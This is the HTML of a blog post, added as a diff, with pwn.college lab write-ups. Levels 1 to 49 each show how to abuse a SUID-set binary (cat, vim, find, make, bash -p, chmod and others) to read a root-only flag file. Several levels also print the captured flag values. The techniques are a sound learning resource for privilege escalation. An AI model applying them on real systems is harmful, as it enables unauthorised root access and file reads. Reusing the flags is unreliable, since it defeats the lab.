@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='以前跟着大佬们卷的，补发一下'><title>pwn.college embryosuid writeups</title>
+
+<link rel='canonical' href='/post/pwn-college-babysuid/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='pwn.college embryosuid writeups'>
+<meta property='og:description' content='以前跟着大佬们卷的，补发一下'>
+<meta property='og:url' content='/post/pwn-college-babysuid/'>
+<meta property='og:site_name' content='s0uthwood&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='SUID' /><meta property='article:tag' content='Labs' /><meta property='article:published_time' content='2023-04-04T00:26:43&#43;08:00'/><meta property='article:modified_time' content='2023-04-04T00:26:43&#43;08:00'/><meta property='og:image' content='/post/pwn-college-babysuid/cover.jpg' />
+<meta name="twitter:title" content="pwn.college embryosuid writeups">
+<meta name="twitter:description" content="以前跟着大佬们卷的，补发一下"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/post/pwn-college-babysuid/cover.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/pwn-college-babysuid/">
+                <img src="/post/pwn-college-babysuid/cover_hu49e7daec41668e669b103e60b6fba5c9_14595991_800x0_resize_q75_box.jpg"
+                        srcset="/post/pwn-college-babysuid/cover_hu49e7daec41668e669b103e60b6fba5c9_14595991_800x0_resize_q75_box.jpg 800w, /post/pwn-college-babysuid/cover_hu49e7daec41668e669b103e60b6fba5c9_14595991_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="424" 
+                        loading="lazy"
+                        alt="Featured image of post pwn.college embryosuid writeups" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/labs/" >
+                Labs
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/pwn-college-babysuid/">pwn.college embryosuid writeups</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        以前跟着大佬们卷的，补发一下
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 04, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-pencil" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#9e9e9e" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+    <path d="M4 20h4L18.5 9.5a1.5 1.5.0 00-4-4L4 16v4"></path>
+    <line x1="13.5" y1="6.5" x2="17.5" y2="10.5"></line>
+</svg>
+                <time class="article-words">
+                    593 words
+                </time>
+            </div>
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <p>level 1 - level 49</p>
+<p>Ref: <a class="link" href="https://gtfobins.github.io"  target="_blank" rel="noopener"
+    >GTFOBins</a></p>
+<h2 id="level1-cat">level1 cat</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /flag
+</span></span></code></pre></div><h2 id="level2-more">level2 more</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ more /flag
+</span></span></code></pre></div><h2 id="level3-less">level3 less</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ less /flag
+</span></span></code></pre></div><h2 id="level4-tail">level4 tail</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ tail /flag
+</span></span></code></pre></div><h2 id="level5-head">level5 head</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ head /flag
+</span></span></code></pre></div><h2 id="level6-sort">level6 sort</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sort /flag
+</span></span></code></pre></div><h2 id="level7-vim">level7 vim</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ vim /flag
+</span></span></code></pre></div><h2 id="level8-emacs">level8 emacs</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ emacs /flag
+</span></span></code></pre></div><h2 id="level9-nano">level9 nano</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nano /flag
+</span></span></code></pre></div><h2 id="level10-rev">level10 rev</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rev /flag | rev
+</span></span></code></pre></div><h2 id="level11-od">level11 od</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ od -c /flag
+</span></span></code></pre></div><h2 id="level12-hd">level12 hd</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hd /flag
+</span></span></code></pre></div><h2 id="level13-xxd">level13 xxd</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ xxd /flag
+</span></span></code></pre></div><h2 id="level14-base32">level14 base32</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ base32 /flag | base32 -d
+</span></span></code></pre></div><h2 id="level15-base64">level15 base64</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ base64 /flag | base64 -d
+</span></span></code></pre></div><h2 id="level16-split">level16 split</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ split /flag
+</span></span><span style="display:flex;"><span>$ cat xaa
+</span></span></code></pre></div><h2 id="level17-gzip">level17 gzip</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gzip -k /flag
+</span></span><span style="display:flex;"><span>$ gzip -cd /flag.gz
+</span></span></code></pre></div><h2 id="level18-bzip2">level18 bzip2</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ bzip2 -k /flag
+</span></span><span style="display:flex;"><span>$ bzip2 -cd /flag.bz2
+</span></span></code></pre></div><h2 id="level19-zip">level19 zip</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ zip -q -r /home/hacker/flag.zip /flag
+</span></span><span style="display:flex;"><span>$ cd ~
+</span></span><span style="display:flex;"><span>$ unzip flag.zip
+</span></span><span style="display:flex;"><span>$ cat flag
+</span></span></code></pre></div><h2 id="level20-tar">level20 tar</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ tar -cf flag.tar /flag
+</span></span><span style="display:flex;"><span>$ cat flag.tar
+</span></span></code></pre></div><h2 id="level21-ar">level21 ar</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ar r flag.bak /flag
+</span></span><span style="display:flex;"><span>$ ar pv flag.bak
+</span></span></code></pre></div><h2 id="level22-cpio">level22 cpio</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cpio -o &gt; flag.cpio
+</span></span><span style="display:flex;"><span>/flag
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> block
+</span></span><span style="display:flex;"><span>$ cat flag.cpio
+</span></span></code></pre></div><p>输入后需要 <code>CTRL+D</code></p>
+<h2 id="level23-genisoimage">level23 genisoimage</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ genisoimage -sort /flag
+</span></span></code></pre></div><h2 id="level24-env">level24 env</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ env -i LOGNAME<span style="color:#f92672">=</span>root cat /flag
+</span></span></code></pre></div><h2 id="level25-find">level25 find</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ find /flag -exec cat /flag <span style="color:#ae81ff">\;</span>
+</span></span></code></pre></div><h2 id="level26-make">level26 make</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ make -s --eval<span style="color:#f92672">=</span><span style="color:#e6db74">$&#39;x:\n\t-&#39;</span><span style="color:#e6db74">&#34;cat /flag&#34;</span>
+</span></span></code></pre></div><h2 id="level27-nice">level27 nice</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nice cat /flag
+</span></span></code></pre></div><h2 id="level28-timeout">level28 timeout</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ timeout <span style="color:#ae81ff">0</span> cat /flag
+</span></span></code></pre></div><h2 id="level29-stdbuf">level29 stdbuf</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ stdbuf -e <span style="color:#ae81ff">0</span> cat /flag
+</span></span></code></pre></div><h2 id="level30-setarch">level30 setarch</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ setarch <span style="color:#e6db74">`</span>uname -m<span style="color:#e6db74">`</span> cat /flag
+</span></span></code></pre></div><h2 id="level31-watch">level31 watch</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ watch -x cat /flag
+</span></span></code></pre></div><h2 id="level32-socat">level32 socat</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ socat - /flag
+</span></span></code></pre></div><h2 id="level33-whiptail">level33 whiptail</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whiptail --title <span style="color:#e6db74">&#34;flag&#34;</span> --textbox /flag <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">60</span>
+</span></span></code></pre></div><h2 id="level34-awk">level34 awk</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> /flag
+</span></span></code></pre></div><h2 id="level35-sed">level35 sed</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sed 1iflag /flag
+</span></span></code></pre></div><h2 id="level36-ed">level36 ed</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ed /flag
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>p
+</span></span><span style="display:flex;"><span>pwn.college<span style="color:#f92672">{</span>MABuWOvAD1P-cN_mEnrA0aKbqm0.QX4cTMsMTNzIzW<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="level37-chown">level37 chown</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chown hacker /flag
+</span></span><span style="display:flex;"><span>$ cat /flag
+</span></span></code></pre></div><h2 id="level38-chmod">level38 chmod</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">777</span> /flag
+</span></span><span style="display:flex;"><span>$ cat /flag
+</span></span></code></pre></div><h2 id="level39-cp">level39 cp</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cd
+</span></span><span style="display:flex;"><span>$ touch flag
+</span></span><span style="display:flex;"><span>$ cp /flag ./flag
+</span></span><span style="display:flex;"><span>$ cat ./flag
+</span></span></code></pre></div><h2 id="level40-mv">level40 mv</h2>
+<p>大佬分享的非预期：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./babysuid_level40 
+</span></span><span style="display:flex;"><span>I just set the SUID bit on /usr/bin/mv.
+</span></span><span style="display:flex;"><span>Try to use it to read the flag!
+</span></span><span style="display:flex;"><span>$ mv /flag /usr/bin/mv
+</span></span><span style="display:flex;"><span>$ ./babysuid_level40 
+</span></span><span style="display:flex;"><span>I just set the SUID bit on /usr/bin/mv.
+</span></span><span style="display:flex;"><span>Try to use it to read the flag!
+</span></span><span style="display:flex;"><span>$ cat /usr/bin/mv
+</span></span><span style="display:flex;"><span>pwn.college<span style="color:#f92672">{</span>4SnSPoCQ0fKPmK78WmZTcNC4AJH.QXygTMsMTNzIzW<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="level41-perl">level41 perl</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>open(<span style="color:#66d9ef">my</span> $DATA, <span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#e6db74">&lt;$DATA&gt;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$_&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ perl tmp.pl
+</span></span></code></pre></div><h2 id="level42-python">level42 python</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python
+</span></span><span style="display:flex;"><span>Python 3.8.10 <span style="color:#f92672">(</span>default, Sep <span style="color:#ae81ff">28</span> 2021, 16:10:42<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>GCC 9.3.0<span style="color:#f92672">]</span> on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; print <span style="color:#f92672">(</span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/flag&#34;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>pwn.college<span style="color:#f92672">{</span>Ev66U3NOGzi2t8zv_EblEPcFxke.QX0gTMsMTNzIzW<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="level43-ruby">level43 ruby</h2>
+<p>ruby:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;/flag&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>aFile<span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span>  print aFile<span style="color:#f92672">.</span>sysread(<span style="color:#ae81ff">56</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ruby tmp.rb
+</span></span></code></pre></div><h2 id="level44-bash">level44 bash</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ bash -p
+</span></span><span style="display:flex;"><span>bash-5.0# cat /flag
+</span></span></code></pre></div><p><code>-p</code> 参数解释</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup  files  are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is  supplied at invocation, the startup behavior is the same, but the effective user id is not reset.
+</span></span></code></pre></div><h2 id="level45-date">level45 date</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ date -f /flag
+</span></span><span style="display:flex;"><span>date: invalid date <span style="color:#e6db74">&#39;pwn.college{4yRYZ2EnEFVNn5PyMploA9lDRbu.QX3gTMsMTNzIzW}&#39;</span>
+</span></span></code></pre></div><h2 id="level46-dmesg">level46 dmesg</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dmesg -F /flag
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>    0.000000<span style="color:#f92672">]</span> pwn.college<span style="color:#f92672">{</span>khG5pEBRIugU-iqAnXo5IrAc8aY.QX4gTMsMTNzIzW<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="level47-wc">level47 wc</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wc --files0-from<span style="color:#f92672">=</span>/flag
+</span></span><span style="display:flex;"><span>wc: <span style="color:#e6db74">&#39;pwn.college{4-U_qRIx9hIQxqigjbHGC1TwSwr.QX5gTMsMTNzIzW}&#39;$&#39;\n&#39;</span>: No such file or directory
+</span></span></code></pre></div><h2 id="level48-gcc">level48 gcc</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gcc -x c -E /flag
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1 &#34;/flag&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1 &#34;&lt;built-in&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1 &#34;&lt;command-line&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 31 &#34;&lt;command-line&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1 &#34;/usr/include/stdc-predef.h&#34; 1 3 4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 32 &#34;&lt;command-line&gt;&#34; 2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1 &#34;/flag&#34;</span>
+</span></span><span style="display:flex;"><span>pwn.college<span style="color:#f92672">{</span>s5r0-Omp6yG9yKCG_GcbIaVA7n8.QXwkTMsMTNzIzW<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="level49-as">level49 as</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ as /flag
+</span></span><span style="display:flex;"><span>/flag: Assembler messages:
+</span></span><span style="display:flex;"><span>/flag:1: Error: no such instruction: <span style="color:#e6db74">`</span>pwn.college<span style="color:#f92672">{</span>8TNLU4ksN4dgFosuuJVfSZEmmfX.QXxkTMsMTNzIzW<span style="color:#f92672">}</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><h2 id="level50-wgetunsolved">level50 wget(unsolved)</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"></code></pre></div><h2 id="level51-ssh-keygenunsolved">level51 ssh-keygen(unsolved)</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"></code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/suid/">SUID</a>
+        
+            <a href="/tags/labs/">Labs</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/post/pwn-college-embryoasm/">
+        
+        
+            <div class="article-image">
+                <img src="/post/pwn-college-embryoasm/cover.430e17d79dca1928c343970d5adb0e3c_huc49026d0171a2bbd038c4185e9d0bdb2_523180_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pwn.college embryoasm writeups"
+                        
+                        data-hash="md5-Qw4X153KGSjDQ5cNWtsOPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">pwn.college embryoasm writeups</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/pwn-college-embryoio/">
+        
+        
+            <div class="article-image">
+                <img src="/post/pwn-college-embryoio/cover.cb06cde85f64c877cddd940a28ff0e6a_hudb1b3410b7f24b071b88cd232e292e79_1180983_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pwn.college embryoio writeups"
+                        
+                        data-hash="md5-ywbN6F9kyHfN3ZQKKP8Oag==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">pwn.college embryoio writeups</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/cs110l-week1-writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/post/cs110l-week1-writeup/cover.d97a4e9bacbf09615289bdd184b30852_huc101b9772897c0a3dab66cf39b92edd1_2229379_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CS110L week1 writeup"
+                        
+                        data-hash="md5-2XpOm6y/CWFSib3RhLMIUg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CS110L week1 writeup</h2>
+        </div>
+    </a>
+</article>
+                
